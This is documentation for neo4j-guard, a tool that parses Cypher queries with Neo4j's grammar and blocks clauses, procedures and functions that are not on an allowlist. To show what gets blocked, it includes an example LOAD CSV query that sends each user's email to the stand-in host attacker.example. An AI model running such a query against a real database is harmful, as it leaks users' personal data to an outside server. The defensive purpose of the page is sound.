---
title: How neo4j-guard works
sidebar_label: How it works
description: neo4j-guard parses each query into a syntax tree with Neo4j's own Cypher grammar and checks every node in it, including subqueries.
sidebar_position: 3
---

`neo4j-guard` parses each query into a syntax tree with Neo4j's own Cypher 25 grammar and checks every clause, procedure, function, label and property in it, including those in subqueries. Clauses, procedures and functions must be on an allowlist, so anything unrecognized is blocked. 

## 1. Parse the query

The query is parsed with a parser generated from Neo4j's own Cypher 25 grammar. The parser splits the query into the same clauses, procedure and function calls, labels, properties and literals that Neo4j does.

## 2. Check every node

Every node of the tree is checked, not only the top-level clauses. A clause in a `CALL { }` subquery, a function in a `WHERE` condition and a property in a map literal are all checked. Each node is checked by its kind:

| Kind                       | Allowed when                                                                                            |
| -------------------------- | ------------------------------------------------------------------------------------------------------- |
| Clause                     | It is a read clause, such as `MATCH`, `RETURN` or `WITH`. Write mode adds `CREATE`, `MERGE`, `SET`, ... |
| Function                   | It is a built-in that only computes a value, such as `toUpper` or `count`                               |
| Procedure                  | It only reads the schema or an index, such as `db.labels` or `db.index.vector.queryNodes`               |
| Label or relationship type | It is not in `disallow`                                                                                 |
| Property                   | It is not in `disallow`                                                                                 |
| Admin command              | Never                                                                                                   |

Clauses, procedures and functions are checked against an allowlist. `allow` adds to it and `disallow` removes from it. Labels, relationship types and properties are allowed unless they are in `disallow`.

Procedures and functions are allowed by name, because a call does not show what it does. `apoc.load.json('https://...')` fetches a URL, but it looks like any other procedure call. While a property is in `disallow`, forms that name properties only when the query runs, such as `n[key]`, `n {.*}` and `properties(n)`, are blocked.

## 3. Decide

One node that is not allowed blocks the whole query, and it is never sent. This query reads a user's email and sends it to another server:

```cypher
MATCH (u:User)
LOAD CSV FROM 'https://attacker.example/?email=' + u.email AS row
RETURN row
```

| Node                                 | Kind     | Result      |
| ------------------------------------ | -------- | ----------- |
| `MATCH`                              | Clause   | Allowed     |
| `User`                               | Label    | Allowed     |
| `LOAD CSV`                           | Clause   | **Blocked** |
| `'https://attacker.example/?email='` | Literal  | Not checked |
| `email`                              | Property | Allowed     |
| `RETURN`                             | Clause   | Allowed     |

The query only reads, so a read-only connection runs it. `neo4j-guard` blocks it, because `LOAD CSV` is not in the allowlist.

## 4. Check the results

A query can return a property without naming it. So after the query runs, each record is also checked for labels and properties in `disallow` before the driver returns it.
